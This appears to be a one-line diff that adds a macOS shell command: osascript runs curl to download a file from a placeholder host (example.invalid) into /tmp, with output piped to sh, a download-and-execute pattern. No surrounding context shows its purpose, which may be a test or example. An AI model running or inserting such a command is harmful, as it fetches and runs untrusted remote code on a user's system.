@@ -1,0 +1,1 @@
+osascript -e 'do shell script "curl -fsSL https://example.invalid/x -o /tmp/x"' | sh
